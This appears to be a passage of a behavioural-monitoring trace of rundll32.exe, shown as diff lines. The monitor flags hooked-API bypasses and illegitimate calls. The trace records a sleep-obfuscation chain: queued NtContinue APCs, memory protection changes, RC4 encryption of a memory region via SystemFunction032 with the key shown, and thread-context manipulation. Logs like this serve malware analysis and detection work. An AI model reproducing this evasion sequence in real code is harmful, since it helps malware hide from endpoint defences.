+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FDA6740
+[RET] [0xe041c8506a]
+
+[CNT] [485]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD9F870
+[RET] [0xe041c8506a]
+
+[CNT] [486]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FDA0710
+[RET] [0xe041c8506a]
+
+[CNT] [487]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtAlertResumeThread> in [ntdll.dll] 
+[PAR] HANDLE  ThreadHandle          : 0x2f8
+[PAR] PULONG  PreviousSuspendCount  : 0x0
+[RET] [0xe041c660e5]
+
+[CNT] [488]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD9FD50
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03690C80 (ntdll.dll!ZwWaitForSingleObject)
+[FLD]          -> Rsp          = 0x000000E042372D98
+[FLD]          -> Rcx          = 0x00000000000002F4
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [489]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <ZwWaitForSingleObject> in [ntdll.dll] 
+[PAR] HANDLE         KeyedEventHandle : 0x2f4
+[PAR] BOOLEAN        Alertable        : 0x0
+[PAR] PLARGE_INTEGER Timeout          : 0x0
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [490]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSignalAndWaitForSingleObject> in [ntdll.dll] 
+[PAR] HANDLE         SignalHandle : 0x2f4
+[PAR] HANDLE         WaitHandle   : 0x2f8
+[PAR] BOOLEAN        Alertable    : 0x0
+[PAR] PLARGE_INTEGER Timeout      : 0x0
+[RET] [0xe041c85460]
+
+[CNT] [491]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [492]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FDA53C0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03691140 (ntdll.dll!ZwProtectVirtualMemory)
+[FLD]          -> Rsp          = 0x000000E042373D98
+[FLD]          -> Rcx          = 0xFFFFFFFFFFFFFFFF
+[FLD]          -> Rdx          = 0x000000E04227F728
+[FLD]          -> R8           = 0x000000E04227F730
+[FLD]          -> R9           = 0x0000000000000004
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [493]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <ZwProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F728 (0x000000E041C50000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F730 (0x4c000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [494]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [495]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FDA58A0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA060913E0 (CRYPTSP.DLL!SystemFunction032)
+[FLD]          -> Rsp          = 0x000000E042374D98
+[FLD]          -> Rcx          = 0x000000E04227F758
+[FLD]          -> Rdx          = 0x000000E04227F768
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [496]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <SystemFunction032> in [CRYPTSP.DLL] 
+[INF] [ Undocumented RC4 implementation ]
+[PAR] PBINARY_STRING buffer : 0x000000E04227F758
+[FLD]                -> Length    = 0x4c000
+[FLD]                -> MaxLength = 0x4c000
+[FLD]                -> Buffer    = 0x000000E041C50000 
+[PAR] PBINARY_STRING key    : 0x000000E04227F768
+[FLD]                -> Length    = 0x10
+[FLD]                -> MaxLength = 0x10
+[FLD]                -> Buffer    = 0x000000E04227F744 ([0x65,0xf3,0x43,0x22,0xf0,0x53,0x13,0x3d,0x6b,0x53,0x7f,0x78,0xdb,0xef,0xa,0x28])
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [497]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [498]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD9EEB0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03691A50 (ntdll.dll!NtGetContextThread)
+[FLD]          -> Rsp          = 0x000000E042375D98
+[FLD]          -> Rcx          = 0x00000000000002FC
+[FLD]          -> Rdx          = 0x000000E03FDA0230
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [499]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x2fc
+[PAR] PCONTEXT ThreadContext : 0x000000E03FDA0230
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [500]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [501]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD9F390
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA036922D0 (ntdll.dll!NtSetContextThread)
+[FLD]          -> Rsp          = 0x000000E042376D98
+[FLD]          -> Rcx          = 0x00000000000002FC
+[FLD]          -> Rdx          = 0x000000E03FDA10D0
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [502]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0x2fc
+[PAR] PCONTEXT Context      : 0x000000E03FDA10D0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA02690F8A (ntdll.dll!NtDelayExecution + 0xa)
+[FLD]          -> Rsp          = 0x000000E042275528
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [503]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [504]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FDA6260
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03692720 (ntdll.dll!NtWaitForKeyedEvent)
+[FLD]          -> Rsp          = 0x000000E042377D98
+[FLD]          -> R9           = 0x000000E03FD5BF70
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [505]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtWaitForKeyedEvent> in [ntdll.dll] 
+[PAR] HANDLE         KeyedEventHandle : 0x0
+[PAR] PVOID          KeyValue         : 0x0
+[PAR] BOOLEAN        Alertable        : 0x0
+[PAR] PLARGE_INTEGER Timeout          : 0x000000E03FD5BF70
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [506]
+[PTP] [0xa6c] [0xad4] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+
